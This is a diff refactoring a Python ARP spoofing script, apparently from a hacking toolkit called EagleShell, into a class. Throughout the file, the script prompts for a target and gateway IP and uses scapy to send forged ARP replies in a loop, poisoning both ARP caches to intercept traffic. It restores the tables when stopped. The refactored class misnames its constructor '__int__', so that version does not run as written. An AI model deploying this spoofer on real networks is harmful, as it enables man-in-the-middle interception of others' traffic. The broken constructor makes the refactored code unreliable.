@@ -1,163 +1,116 @@
 #!/usr/bin/python3
 
-# ARPSpoof - ARP Spoof Script
-
-# Imports all needed variables and packages
 from assets.banners import arpspoof_banner
-from assets.designs import *
+from assets.colors import *
+from assets.designs import logo, author
+from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, gateway_prefix
 from assets.properties import clear_screen
-from assets.redirect import redirect_eagleshell_network
-from assets.redirect import redirect_eagleshell_menu
+from assets.shortcuts import Exit
+from .network import Network
+import os
 import scapy.all as scapy
 import time
 import sys
-import os
 
 
-# Main function
-def arpspoof_main():
+class ARPSpoof:
+    def __int__(self):
+        self.configuration()
+        self.process()
 
-    # Function that takes user input
-    def configuration():
+    def header(self):
+        os.system(clear_screen)
+        print(logo)
+        print(arpspoof_banner)
+        print(author)
+
+    def configuration(self):
         try:
-            global rhost_set
-            global gateway_set
-            os.system(clear_screen)
-            print(logo)
-            print('')
-            print(line)
-            print(arpspoof_banner)
-            print(line)
-            print('')
-            print(author)
+            self.header()
             print('Configuration:')
-            print('')
-            print('\tRHOST = Target IP')
+            print('\n\tRHOST = Target IP')
             print('\tExample: 192.168.1.133')
-            print('')
-            print('\tGATEWAY = Router IP')
+            print('\n\tGATEWAY = Router IP')
             print('\tExample: 192.168.1.2')
-            print('')
-            print('\tZ): Back')
-            print('\tX): Exit')
-            print('')
-            while True:
-                rhost_set = input('\u001b[33mRHOST \u001b[37m> ').lower()
-                if rhost_set == 'z':
-                    redirect_eagleshell_network()
-                elif rhost_set == 'x':
-                    exit_shell()
-                gateway_set = input('\u001b[33mGATEWAY \u001b[37m> ').lower()
-                if gateway_set == 'z':
-                    arpspoof_main()
-                elif gateway_set == 'x':
-                    exit_shell()
-                process()
+            print('\n\tZ): Back')
+            print('\tX): Exit\n')
+            self.rhost_set = input(rhost_prefix).lower()
+            if self.rhost_set == 'z':
+                Network()
+            elif self.rhost_set == 'x':
+                Exit()
+            self.gateway_set = input(gateway_prefix).lower()
+            if self.gateway_set == 'z':
+                Network()
+            elif self.gateway_set == 'x':
+                Exit()
         except KeyboardInterrupt:
-            exit_shell()
+            Exit()
 
-    # Function that gets MAC address
-    def get_mac(ip):
+    def process(self):
+        try:
+            self.sent_packets_count = 0
+            while True:
+                self.spoof(self.rhost_set, self.gateway_set)
+                self.spoof(self.gateway_set, self.rhost_set)
+                self.sent_packets_count = self.sent_packets_count + 2
+                sys.stdout.flush()
+                time.sleep(2)
+                self.header()
+                print('Process:')
+                print('\n\tStatus')
+                print('\t------')
+                print('\tPACKETS SENT: ' + str(self.sent_packets_count))
+                print('\n\tStop: CTRL+C\n')
+        except KeyboardInterrupt:
+            print(GREEN + '\n[+] Resetting ARP Tables')
+            self.restore(self.rhost_set, self.gateway_set)
+            self.restore(self.gateway_set, self.rhost_set)
+            self.result()
+
+    def spoof(self, target_ip, spoof_ip):
+        try:
+            target_mac = self.get_mac(target_ip)
+            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+            scapy.send(packet, verbose=False)
+        except IndexError:
+            print(invalid_input_prefix)
+            os.system('sleep 1')
+            ARPSpoof()
+
+    def get_mac(self, ip):
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast/arp_request
         answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        return answered_list[0][1].hwsrc
 
-        return(answered_list[0][1].hwsrc)
-
-    # Function that spoofs
-    def spoof(target_ip, spoof_ip):
-        try:
-            target_mac = get_mac(target_ip)
-            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-            scapy.send(packet, verbose=False)
-        except IndexError:
-            print('\u001b[31m[-] Invalid Input.')
-            os.system('sleep 1')
-            arpspoof_main()
-
-    # Function that restores MAC
-    def restore(destination_ip, source_ip):
-        destination_mac = get_mac(destination_ip)
-        source_mac = get_mac(source_ip)
+    def restore(self, destination_ip, source_ip):
+        destination_mac = self.get_mac(destination_ip)
+        source_mac = self.get_mac(source_ip)
         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, count=4, verbose=False)
 
-    # Function that runs functions and displays results
-    def process():
-        global sent_packets_count
+    def result(self):
         try:
-            sent_packets_count = 0
-            while True:
-                spoof(rhost_set, gateway_set)
-                spoof(gateway_set, rhost_set)
-                sent_packets_count = sent_packets_count + 2
-                sys.stdout.flush()
-                time.sleep(2)
-                os.system(clear_screen)
-                print(logo)
-                print('')
-                print(line)
-                print(arpspoof_banner)
-                print(line)
-                print('')
-                print(author)
-                print('Process:')
-                print('')
-                print('\tStatus')
-                print('\t------')
-                print('\tPACKETS SENT: ' + str(sent_packets_count))
-                print('')
-                print('\tStop: CTRL+C')
-                print('')
-        except KeyboardInterrupt:
-            print('\n\u001b[32;1m[+] Resetting ARP Tables')
-            restore(rhost_set, gateway_set)
-            restore(gateway_set, rhost_set)
-            result()
-
-    # Function that gives all results
-    def result():
-        try:
-            os.system(clear_screen)
-            print(logo)
-            print('')
-            print(line)
-            print(arpspoof_banner)
-            print(line)
-            print('')
-            print(author)
+            self.header()
             print('Result:')
-            print('')
-            print('\tRHOST: ' + rhost_set)
-            print('\tGATEWAY: ' + gateway_set)
-            print('')
-            print('\tPACKETS SENT: ' + str(sent_packets_count))
-            print('')
-            print('\tY): New')
+            print('\n\tRHOST: ' + self.rhost_set)
+            print('\tGATEWAY: ' + self.gateway_set)
+            print('\n\tPACKETS SENT: ' + str(self.sent_packets_count))
+            print('\n\tY): New')
             print('\tZ): Menu')
-            print('\tX): Exit')
-            print('')
+            print('\tX): Exit\n')
             while True:
-                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
-                if eagleshell_cmd == 'y':
-                    arpspoof_main()
-                elif eagleshell_cmd == 'z':
-                    redirect_eagleshell_menu()
-                elif eagleshell_cmd == 'x':
-                    exit_shell()
+                cmd = input(eagleshell_prefix).lower()
+                if cmd == 'y':
+                    ARPSpoof()
+                elif cmd == 'z':
+                    Network()
+                elif cmd == 'x':
+                    Exit()
                 else:
-                    print('\u001b[31m[-] Invalid Input.')
+                    print(invalid_input_prefix)
                     continue
         except KeyboardInterrupt:
-            exit_shell()
-
-    # Function that exit
-    def exit_shell():
-        from assets.functions import exit_main
-        exit_main()
-
-    configuration()
-
-
-arpspoof_main()
+            Exit()
